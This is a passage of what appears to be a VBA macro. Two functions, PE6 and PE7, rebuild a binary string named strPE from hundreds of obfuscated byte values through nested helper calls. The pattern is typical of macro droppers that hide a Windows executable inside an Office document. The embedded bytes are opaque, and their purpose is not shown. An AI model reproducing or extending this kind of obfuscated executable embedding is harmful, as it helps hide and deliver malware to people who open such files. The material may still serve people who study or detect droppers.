    strPE = B(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "h"), 152), 210), "@"), 210), 232), "4"), 228), 28), 255), 131), 196), 16), "V"), 30), "F"), 8), 0), 0), 0), 0), 232), "D"), 254), 255), "["), 131), 196), 4), "_^^"), 139), 229), "]"), 183), 184), "S"), 0), 0), 0), 199), "F6`"), 0), 0), "="), 9), "F")
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(strPE, 8), 174), 21), 248), 23), "A"), 0), 141), "M"), 236), 137), "E"), 240), 139), 7), "QAf"), 199), "E"), 244), 4), 0), 22), 214), 248), 137), "u"), 252), 232), "j&"), 0), 0), "_|;"), 139), 229), 231), 195), 199), 170), 8), 2), 0), 0), 0), 139), 21)
    strPE = A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(strPE, "|"), 2), "A"), 0), "BV"), 137), 21), 168), 2), "A"), 0), 232), "-"), 228), 255), 172), 131), 217), "A_^["), 160), 229), 225), 195), 144), 190), 144), 144), 144), 144), 144), 144), "?"), 144), 144), 144), 144), 144), 144), "U"), 139), 236), 131), 236), 18), "V"), 139)
    strPE = A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(strPE, "u"), 8), "W"), 139), "F"), 196), 133), 192), "u"), 34), 139), "}$"), 8), 207), 0), "5"), 192), "t"), 24), "@"), 180), 2), 234), 0), 133), 192), 15), 132), "l"), 166), 0), 246), "H="), 180), 2), "A"), 0), 233), 0), 1), 0), 0), 131), "="), 180), "HA"), 0)
    strPE = A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(strPE, "Zu"), 10), 139), 253), 16), 163), 140), 2), 178), 0), "r$"), 139), "N"), 16), 161), 140), 157), "A"), 0), ";"), 200), "t"), 249), ")"), 13), 184), 2), "w$"), 161), 192), 2), "A"), 0), "A@"), 137), "!"), 229), 2), "A"), 0), 10), 192), 239), "A"), 0), 161)
    strPE = A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(strPE, 172), 2), "A"), 169), 139), 13), 16), 208), "@"), 0), ";"), 193), 15), 141), 23), 1), 0), "v"), 139), 21), 200), 11), "A%"), 139), 248), "g"), 231), 5), 3), 250), "@"), 163), 172), 2), "A"), 0), 232), 218), "."), 0), 0), 183), 160), 11), "A"), 0), 137), "="), 164)
    strPE = A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(strPE, 11), "A"), 0), "K"), 134), 235), 8), "B"), 149), 139), 21), 164), 11), "A"), 0), 139), 134), "0"), 8), 178), 0), "p"), 150), "T"), 8), 0), 0), "y"), 7), 139), 142), "4"), 8), 127), 0), 137), "O"), 4), 139), 142), "@"), 8), 0), 0), 139), 134), 179), 8), "U"), 0)
    strPE = A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(strPE, 139), 150), "4"), 8), "z"), 0), "+"), 200), "5"), 134), "<"), 8), 0), 0), 27), 194), 250), 192), 127), 10), "|"), 4), 133), 201), "s"), 4), "3"), 178), "3"), 192), 137), 237), 16), 137), 28), 17), 139), 142), "P"), 8), 0), 0), "o"), 134), "0"), 8), 0), 0), 194), 246)
    strPE = A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(strPE, "4"), 8), 21), 0), "+"), 200), 139), 134), "T%"), 0), 180), 27), ","), 133), 192), 127), 10), "|"), 4), 133), 201), "s"), 4), "3"), 201), "3"), 192), 247), "O"), 24), "xG"), 28), 139), 142), "H"), 8), 0), 17), 139), 15), "@"), 8), 0), 0), 139), "TD"), 8)
    strPE = A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(strPE, 0), 0), "+"), 200), 139), 134), "L\"), 0), 0), 27), 194), 133), 192), 127), 181), "|"), 4), 133), 201), 18), 138), "3"), 201), "3"), 192), 137), "O"), 8), 137), "G"), 12), 139), 13), 20), 208), "@"), 0), 133), 30), "t"), 239), 139), "="), 172), 2), "A"), 0), 139), 199)
    strPE = A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(strPE, 153), 247), 249), 133), 210), "u("), 139), 21), 200), 192), 132), 0), "W"), 131), "x@h@"), 232), "@"), 0), "R"), 255), 21), 27), 193), "@"), 0), 161), 200), 192), 160), 0), 131), 192), "lP"), 255), 21), "T"), 193), ","), 0), 131), 20), 16), "u"), 248), 23)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(strPE, "A"), 0), 139), "N"), 4), 141), "U"), 236), 197), "E"), 240), 1), 0), 0), 0), "RP"), 22), "M"), 248), 232), 201), "%@"), 0), 139), "N"), 225), "Q"), 232), 198), 222), 251), 0), "VXF"), 8), 0), 0), 0), 0), 232), 9), 252), 255), "G"), 131), 196), 4)
    strPE = A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(strPE, "_."), 139), 136), "]"), 195), "U"), 139), "("), 129), "P"), 160), 0), 0), 0), "S"), 139), "]"), 243), "V"), 141), "E"), 252), 139), "K"), 4), "WPh"), 192), 24), "A"), 0), "Q"), 150), "E"), 252), 229), " "), 0), "I"), 232), 184), "N"), 163), 0), "*"), 240), 131), 254)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 11), 15), 132), 4), 6), 0), 0), 129), 254), "hP"), 10), 0), "m"), 132), 234), 5), 0), "_"), 193), 254), 217), 252), 10), 0), 15), 132), 236), 5), 24), 0), 129), 254), "W"), 253), 10), 0), 15), 132), 163), 5), 5), 149), 129), 254), "$"), 253), 10), 0), 15)
    strPE = B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(strPE, 132), 212), 5), 0), "r"), 129), 254), "3"), 252), 10), 0), 178), 132), 200), 5), 0), 0), 129), 254), 179), "#"), 11), 0), 15), 132), 188), 159), 0), "D"), 139), "M"), 252), 179), 255), 234), 207), 166), "%"), 129), 254), "~"), 17), 1), "Tu"), 29), 139), 21), 180), "E")
    strPE = B(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(strPE, "A"), 0), "SB"), 176), "Q"), 180), 2), "A"), 0), 232), 145), 253), 255), 255), 131), 196), 4), "_^"), 191), 139), 229), "]"), 195), 162), 197), 34), 127), 139), 13), 200), 2), 156), 139), 161), "\"), 2), "T"), 0), "A;"), 199), 137), 13), 200), 2), "A)t")
    strPE = A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(strPE, "X"), 139), 188), 184), 2), "A"), 0), "SG"), 137), "="), 184), 2), "A"), 0), 232), "Z"), 253), 255), 255), 161), 166), 2), 227), 0), 131), 196), 4), 131), 248), "@"), 15), "OP"), 5), 132), 0), "V"), 141), 149), "`"), 179), "-"), 255), "j5RV"), 232), 145)
    strPE = A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(strPE, "I"), 0), 0), "P"), 161), 200), 192), "@"), 0), "h"), 12), 233), "@"), 0), 131), 192), "@h"), 172), 212), 223), 0), 144), 255), 21), 128), 193), "@"), 0), "'"), 175), 20), "_^["), 139), 229), "]"), 192), 204), "h"), 0), 233), "@"), 0), 232), 186), 137), 172), 255)
    strPE = A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(strPE, 139), "M"), 252), 131), 196), 8), 139), "5"), 144), 2), "A"), 0), 139), 220), 148), 2), "A"), 188), 3), 5), 210), 215), 137), "5"), 144), 2), 207), 16), 137), 21), 148), 2), "A"), 173), 139), "C"), 154), "x"), 199), "u"), 20), "@"), 16), ","), 0), 12), 139), "M"), 252), 137)
    strPE = A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(strPE, 131), "H"), 8), "^"), 0), 137), 147), "L"), 8), 0), 158), 139), "S"), 12), 139), 131), "("), 8), 0), 0), 3), 209), ";"), 158), "@S"), 12), 21), 133), 192), 2), 0), 0), 139), 179), " "), 8), 0), 0), 184), 255), 7), "["), 0), "+q"), 199), "E"), 240), 4)
    strPE = A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(strPE, 0), 0), 0), ";"), 193), 254), "E"), 244), "r"), 3), 240), "Mc"), 139), 147), "3"), 168), 0), 0), 139), 200), "_ 5A"), 0), "y|"), 19), " "), 139), 209), 193), 233), "v"), 243), 165), 139), 202), 139), "U"), 244), 131), 146), "i+"), 194), 243), 164), 139)
    strPE = A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(strPE, 187), " "), 196), 0), 0), 137), "E"), 236), 3), 250), 139), 207), 137), 187), 129), 8), 0), 0), 249), "D"), 25), " "), 0), 161), "X"), 2), "A"), 0), 131), 248), 2), 180), 18), 141), "C4P|"), 240), 154), "@"), 0), 255), 21), 214), 200), "@"), 0), 13), 196)
    strPE = B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(strPE, "T"), 139), "=8"), 193), "f"), 0), "7"), 152), " h"), 232), 232), 135), 0), "V"), 255), 215), 131), 196), 8), 137), "E"), 248), 133), 192), 15), 133), 133), 0), 0), "Sh"), 180), 223), "@"), 0), "V"), 255), 215), 131), 227), 8), 137), "E"), 248), 133), 192), 199), "E")
    strPE = B(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(strPE, 240), "9"), 0), 0), 0), "ul"), 139), "l"), 236), 133), 192), 15), 169), 5), 4), 0), "N"), 161), 134), 23), "AY"), 139), "K"), 26), 141), 204), 175), 199), "E"), 220), 1), 0), 131), 0), "RP"), 137), "M"), 228), 191), "R#"), 0), 0), 139), 31), "TQ")
    strPE = B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(strPE, 232), "Y)"), 0), 0), 171), "o"), 208), "4AQ"), 164), 5), 17), "A"), 0), "A"), 137), 21), "Z"), 2), "A"), 0), 139), "\@"), 184), 250), 10), 163), ","), 2), "Q"), 0), "~"), 13), 254), 176), 210), "@"), 0), 232), "p"), 216), 255), 255), 131), 196), 4), "S")
    strPE = A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(strPE, 232), "w"), 249), 172), 255), 131), 196), 4), "3"), 255), 128), 200), 174), 0), 0), 161), 180), 2), "Am"), 133), 192), "u"), 213), "h"), 224), 232), "@"), 0), "V"), 255), "B"), 131), 196), 7), "d"), 224), 19), "A"), 0), 133), 192), "j"), 23), 9), "H"), 8), 131), 192), 245)
    strPE = A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(strPE, 128), 249), " ~"), 164), 136), 217), 138), "%"), 1), 178), "@"), 128), 249), " "), 127), 244), 198), 11), 0), "h"), 216), 232), "@"), 0), "V"), 255), "F"), 139), 208), 131), 196), 8), 133), 210), "t6"), 191), 9), 131), 201), 255), "W"), 192), 242), 174), 247), 209), "I"), 131)
    strPE = A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(strPE, 249), 9), "v"), 31), 131), 194), 9), "%"), 3), 141), "E"), 27), "RP"), 255), 195), "X9@"), 166), 139), 143), "l"), 193), "@"), 0), 131), 196), 12), 198), "E"), 11), 0), 235), 15), 139), "="), 13), 193), "@"), 0), 139), 13), "h"), 232), "@"), 0), 137), 165), 254)
    strPE = B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(B(strPE, "0+"), 8), "<2C"), 139), 2), "A"), 0), "t"), 29), 139), 13), 208), 225), "V"), 0), "A"), 131), 248), 2), 137), 185), 208), 2), "A"), 0), "|"), 34), 141), "U"), 8), "Rh"), 172), 163), "@5'"), 14), 10), 248), 183), ";"), 18), 141), 252), 8), "O")
    strPE = A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(strPE, "h"), 144), 232), "@"), 0), 255), 21), "d"), 193), 135), 0), 203), 196), 8), 139), "M"), 131), 199), "V("), 8), 0), 0), 161), "C"), 0), 0), 198), 149), 0), 161), 216), 2), "A"), 0), 133), "4n"), 132), 128), 0), 0), 0), "h"), 132), 193), "@"), 0), "V"), 255)
    strPE = A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(strPE, 215), 131), 196), 8), 133), 192), "u"), 12), "hx"), 232), "@"), 0), "V"), 255), 215), 131), "i"), 8), 133), 192), "tbhh"), 232), "@"), 0), 204), 255), 215), 139), 248), 202), 196), 8), 187), 255), "9"), 21), 23), 233), 232), "@"), 0), "V"), 255), 21), "8"), 193)
    strPE = A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(strPE, "@"), 0), 139), 248), 131), "|="), 133), 255), "t"), 140), 199), 131), "$"), 8), 0), 0), 1), 0), 0), 0), 161), "jyA"), 0), "?"), 192), "|"), 15), "3W"), 16), "R"), 255), 161), "?"), 255), "@"), 0), 131), 196), 4), 207), 2), "3r"), 133), 130), 137)
    strPE = A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(strPE, "C"), 28), "u"), 244), 199), 131), "$"), 8), 0), 135), 1), 0), 184), 0), 199), "C"), 28), 0), "m"), 0), 0), 139), "E"), 252), 139), "u"), 248), 139), "U"), 244), "7M"), 240), "+"), 198), 156), 159), 16), "+"), 194), "Q"), 193), 139), 139), " "), 255), 0), 0), 184), 195)
    strPE = B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(strPE, 141), "T"), 8), " "), 221), 242), 140), "s"), 16), 139), 13), 152), 2), ","), 175), 139), "/"), 3), 200), "~"), 156), 2), "A"), 0), 131), 208), 171), 137), 13), 152), 2), 217), 0), "3"), 255), 235), 29), 139), "s"), 16), 3), 217), "Gs4"), 139), 21), 152), "dA")
    strPE = A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(strPE, 0), 161), 156), 2), "A"), 0), 3), 209), 137), 21), 152), 2), "A"), 0), 22), 199), 163), 156), 2), "A"), 0), 228), 187), "$"), 8), 0), 0), 132), 132), 208), 1), 0), 0), 139), "C"), 16), 139), "Kv;"), 193), 15), 130), 254), 1), 0), 0), "u"), 180), 2)
    strPE = A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(strPE, "A2@"), 131), 248), 148), 163), "l"), 2), "A"), 225), "u"), 11), 139), "K"), 16), 137), 13), "B"), 2), "A"), 0), 235), "$"), 139), "S"), 16), 161), 140), 145), "A"), 0), "i"), 204), 177), 24), 139), 13), 184), "YA"), 0), 247), 192), 219), "<"), 0), "A@"), 137)
    strPE = B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(strPE, 13), 184), 2), "Au"), 163), 208), 2), "A"), 0), 12), "S"), 2), "A"), 168), 242), 13), 16), 208), 243), 0), ";"), 193), 15), 141), 19), 247), 0), 0), "S"), 13), 200), 11), "A"), 0), 139), 240), 193), 230), 5), 3), 241), 139), 13), 176), 2), "A"), 0), "@A")
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(strPE, 214), ";"), 2), "A"), 197), 137), 13), 176), "}A"), 165), "6"), 180), "("), 0), 0), 203), 131), "P"), 8), 0), 0), 240), 235), "B"), 156), 251), 143), 137), 234), "T"), 8), 0), "V"), 137), 156), 139), 139), "45"), 0), 0), 137), "N"), 4), 139), 34), 230), 8), 0)
    strPE = B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(strPE, 0), 139), "e7"), 8), 0), 0), 139), 147), "4"), 8), 0), 180), "+"), 200), 139), 189), "<"), 8), "!"), 0), 27), 194), ";"), 199), 127), 10), "|"), 4), ";"), 176), "s"), 4), "3"), 201), "3"), 135), 137), "N"), 16), 137), "F"), 20), 139), 139), "P"), 31), "}"), 0), "=")
    strPE = B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 131), 210), 8), 0), 0), 139), 147), "4"), 8), 0), 149), 235), 200), 139), 131), "T"), 8), 0), 254), 27), 194), "8"), 199), 127), 215), "|"), 4), ";"), 207), "s~3"), 201), "3"), 31), 137), ","), 165), 137), "F"), 28), 139), 139), 10), 8), 0), "e"), 139), 131), "@")
    strPE = A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 8), 0), 0), 139), 147), 190), 8), 204), 0), "-"), 200), 192), 131), "L"), 8), 0), 0), 137), 194), ";"), 199), 127), 10), "|{;"), 207), "s"), 4), "3"), 201), 12), 192), 137), "IR"), 137), 236), 12), "e"), 13), 20), 208), "@"), 155), "'"), 207), "t0"), 139)
    strPE = B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "5"), 172), 2), "N"), 0), 139), 198), 153), 247), 249), 133), 210), "u"), 209), 139), 21), 200), 192), "@"), 0), "V"), 255), 194), "@h@"), 232), 254), 0), "R"), 255), 21), 128), 193), "@"), 128), 161), 200), 192), "@"), 23), 131), 192), "@P"), 255), 222), 224), 193), "@")
    strPE = B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(strPE, 0), " "), 196), 16), 137), 187), "$"), 11), 157), 0), 137), "{"), 31), 137), 135), "(m"), 0), 0), 137), 187), " "), 8), 0), 0), 137), "{"), 16), 137), "{"), 12), 232), 166), "'"), 0), 0), 163), 160), 11), "A"), 243), 137), 234), 248), 11), "A"), 0), 137), 213), "8")
    strPE = B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(strPE, "K"), 0), 0), 139), "m"), 164), 11), 203), 154), 137), 139), "<"), 8), 0), 164), 139), 210), 160), 11), "A"), 0), 137), 147), "6"), 8), 0), 0), 161), 164), "JA"), 0), "S"), 137), 132), "4"), 8), 0), 0), 232), 12), 220), 255), 255), 131), 196), "Q_^[")
    strPE = A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(strPE, 139), 34), "]"), 195), 144), 224), 161), 215), 2), "}"), 0), 231), 139), "t"), 8), 176), "@"), 0), 133), 192), "u&h"), 216), 234), "@"), 0), 181), 180), 234), "@"), 0), 255), 214), "h"), 176), 234), "w"), 0), 145), 214), 6), " "), 234), "@"), 0), "R"), 214), "h"), 128)
    strPE = A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(strPE, "x@"), 150), 255), ">"), 131), 196), 28), "^"), 195), "h"), 20), 14), "@"), 0), 241), 214), "h"), 0), 234), "@"), 0), "hD"), 177), 25), 0), "h"), 200), "F"), 232), 0), 255), 214), 229), "x"), 233), "@"), 0), 255), 214), 12), "("), 132), "@"), 0), 255), 214), "h"), 28)

    PE6 = strPE
End Function

Private Function PE7() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(strPE, 233), "@"), 0), 255), 214), 131), 196), 28), "^"), 195), 144), "!"), 144), 204), 144), 144), 144), 144), "U"), 139), 236), 15), "E"), 247), 139), 13), 175), 192), "@"), 0), "V"), 139), "5"), 128), 193), 227), 0), "P"), 131), 193), "@hd"), 242), "@DQ"), 255), 238), 172)
    strPE = A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(strPE, "c"), 200), 192), "@"), 0), "hT"), 181), "@"), 0), 131), ",@R"), 154), 176), "F"), 200), 192), 210), 0), "h "), 190), "@"), 0), 131), 192), "@X"), 255), 214), 139), 231), 200), 192), "@"), 0), "h"), 228), 241), "@"), 0), 131), ","), 200), "Q"), 9), 214), 255)
    strPE = A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(strPE, 21), 200), 192), "@"), 161), "h"), 129), 212), "@"), 0), 131), 194), "@R"), 255), 216), 170), 200), 192), "@"), 0), "X"), 128), 241), "@"), 0), 131), 192), "@P"), 255), 214), 139), 13), 200), 192), "n"), 143), "a "), 241), 255), 0), 131), 193), "@QL"), 214), 139)
    strPE = B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(strPE, 21), 200), 192), "|"), 0), "h"), 208), 240), "@"), 0), 153), "j@R"), 255), 214), 161), 246), 208), 13), "g"), 131), 196), "D?"), 224), "@"), 138), 148), 16), "@"), 0), "P"), 255), 214), 139), 13), 200), 192), "@"), 0), "h"), 233), 240), "@"), 0), 131), 193), "@Q")
    strPE = B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(strPE, 255), 214), 232), 21), 200), "`@"), 0), 249), "("), 240), "@"), 0), 131), 194), "@R"), 255), 214), 161), 11), 192), "@"), 0), "h"), 236), 239), "@"), 0), 158), "A@P"), 255), 214), 139), 13), 200), 192), "@7"), 7), 180), 239), "@"), 0), 131), 193), "@Q")
    strPE = B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(strPE, 255), 214), 139), 21), "Q"), 192), "@"), 0), "h"), 132), 239), "@"), 0), 131), 194), 19), "R"), 255), "9"), 161), 200), 192), "H"), 0), "h"), 198), 239), "$"), 0), 181), 192), "e"), 194), 22), 214), "h"), 16), 183), "@"), 0), 163), 13), 200), 192), "@"), 0), 131), 238), "@Q")
    strPE = A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(strPE, 255), 214), 190), 21), 200), 192), "@"), 0), 131), 196), "@"), 131), 194), "@h"), 208), 238), 198), 0), "R"), 255), 214), 194), 225), 192), "@"), 0), "h"), 144), 238), "@"), 0), 131), 242), "@P"), 255), 214), 139), 13), 29), 234), 133), 0), "_@D@"), 16), 131)
    strPE = A(A(B(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(strPE, 193), "@Q"), 26), 214), 139), 21), 200), 3), "@"), 0), "h"), 240), "z@"), 0), 131), "w}R"), 255), 214), "h"), 200), 192), "@"), 0), "h"), 168), 237), "@"), 0), 131), 192), "@P"), 255), 214), 139), 189), 200), 192), 146), 0), 22), "C"), 237), "@"), 0), 131)
    strPE = B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(strPE, 193), "@Q"), 255), "+"), 139), 21), 200), 192), 202), 0), "h"), 24), 237), 130), 0), 131), 236), "@R"), 255), ","), 161), 200), 192), "@"), 0), 151), "`"), 237), "@"), 0), 4), 192), "@P"), 255), 214), 139), 13), 227), 192), "@"), 0), 131), "="), 201), 131), "}@")
    strPE = A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(strPE, "h"), 224), 236), 251), "^Q`"), 214), 139), 21), "x"), 140), "@"), 254), "h"), 172), 236), 154), 0), 131), 194), "@R"), 255), 214), 161), 200), 192), 208), "Zh|"), 236), "T"), 0), 190), 192), "@P"), 255), 214), 139), 8), "F^@"), 0), "h@"), 25)
    strPE = A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(strPE, "b"), 0), 131), 193), "@L"), 255), 214), 139), 21), 205), 192), "@"), 0), "h"), 248), 235), "@"), 0), "j"), 194), "@R"), 255), 182), 161), 200), 192), 178), 0), "h"), 176), 235), "@"), 0), 131), 192), "@P"), 255), 214), 139), 13), 200), 192), ":"), 0), 14), "p"), 235)
